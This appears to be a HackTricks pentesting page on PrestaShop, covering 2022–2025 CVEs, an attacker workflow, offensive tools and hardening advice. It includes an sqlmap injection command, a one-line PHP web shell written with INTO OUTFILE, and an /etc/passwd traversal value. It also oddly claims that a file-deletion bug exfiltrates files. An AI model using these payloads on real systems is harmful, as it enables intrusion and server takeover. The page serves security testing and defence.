# PrestaShop

{{#include ../../banners/hacktricks-training.md}}

## From XSS to RCE

*The original section is kept for visibility.*

- **[PrestaXSRF](https://github.com/nowak0x01/PrestaXSRF)** – JavaScript exploitation framework that escalates **stored XSS** found in the PrestaShop back-office to **arbitrary module upload (RCE)** on **8.x** and **1.7.x** branches. In its default **`PSUploadModule()`** mode it leverages the `AdminModules` controller to upload a zipped back-door module and gain a persistent shell. Full write-up available in the [accompanying blog-post](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html).

---

## Recently-relevant vulnerabilities (2022-2025)

### 1. Unauthenticated SQL Injection ➜ Remote Code Execution  
**CVE-2022-36408 / CVE-2022-31181** (core) – fixed in **1.7.8.7**

Attackers chain an **unauthenticated SQLi** (in the `Search` module or any vulnerable third-party module) with the _MySQL Smarty cache_ storage feature. By injecting a malicious Smarty template into the cache table and then triggering its compilation they reach **`eval()`** and execute arbitrary PHP.

Minimal PoC (blind):
```bash
sqlmap -u "https://shop.com/?q=ipad" \
       --method POST -p q \
       --dbms MySQL --risk 3 --level 3 \
       --sql-shell
# WRITEFILE payload into ps_smarty_cache to create backdoor under img/..
```
Trigger compilation by visiting the affected page or by flushing the cache from BO.

Mitigation
1. Patch to ≥ **1.7.8.7** (or any 8.x release)
2. Disable **MySQL Smarty cache** (`config/smarty.config.inc.php`)
3. Remove/patch vulnerable modules.

### 2. SQL-Manager privilege-escalation / potential RCE  
**CVE-2023-30839** (GHSA-gf46-prm4-56pc) – fixed in **1.7.8.10 / 8.0.5 / 8.1.1**

Any **low-privileged back-office user** with access to *Advanced > Database* can abuse missing ACL checks to run arbitrary SQL, including `LOAD_FILE()` / `INTO OUTFILE`, resulting in file read/write and full server compromise.

Write a web-shell directly from the interface:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/img/ws.php";
```
Browse to `/img/ws.php?cmd=id`.

### 3. Directory Traversal on import file deletion  
**CVE-2023-39525** – fixed in **8.1.1**.  
Replay the deletion request with a crafted `filename=../../../../etc/passwd` to exfiltrate arbitrary files.

### 4. Deserialization RCE in **ProductDesigner** module  
**CVE-2024-24302** (< 1.178.36). Unauthenticated payload sent to `productdesigner.php` reaches `unserialize()` in `postProcess()`, giving direct code-execution. Remove or update the module.

### 5. Anonymous stored XSS via contact attachment  
**CVE-2024-34716** (< 8.1.6). Uploading an HTML file through the FO contact form abuses the **customer-thread** feature flag. Payload executes in BO when an admin previews the attachment and can steal CSRF tokens to perform state-changing requests.

---

## Attacker’s workflow cheat-sheet
1. Fingerprint PrestaShop (`/modules/autoupgrade/ajax/` leaks version).
2. Test unauth SQLi (CVE-2022-36408) –> drop web-shell through Smarty cache.
3. If BO creds obtained (phishing, weak password) leverage SQL Manager (CVE-2023-30839) to escalate.
4. Scan `modules/` for **ProductDesigner**, `productdesigner.php` deserialization vector.
5. Attempt stored XSS (CVE-2024-34716) to ride admin cookies and trigger **PrestaXSRF**.

---

## Extra offensive tooling

| Tool | Purpose |
|------|---------|
| [PrestaXSRF](https://github.com/nowak0x01/PrestaXSRF) | XSS ➜ module-upload RCE |
| [prestashop-sqli-rce](https://github.com/friends-of-presta/security-advisories/tree/main/_posts/2022-07-22-core-ps-246) | PoC chain for CVE-2022-36408 |
| `sqlmap –-technique=T` | Automatic detection/exploitation of the MySQL Smarty vector |

---

## Defensive recommendations
• **Upgrade** to the latest LTS (**8.1.6** at the time of writing).  
• Disable or restrict access to **SQL Manager**, remove unused BO accounts.  
• Remove deprecated MySQL Smarty caching and third-party modules you do not absolutely need.  
• Harden the file-system: `open_basedir`, `disable_functions`, proper ownership (Apache ≠ deploy user).  
• Deploy a WAF/ModSecurity ruleset to drop typical injection payloads.



## References

- “PrestaShop fixes bug that lets any backend user delete databases” – BleepingComputer, April 26 2023.  
- “CVE-2022-36408: zero-day PrestaShop SQL injection & RCE” – SecurityOnline, July 22 2022.
{{#include ../../banners/hacktricks-training.md}}
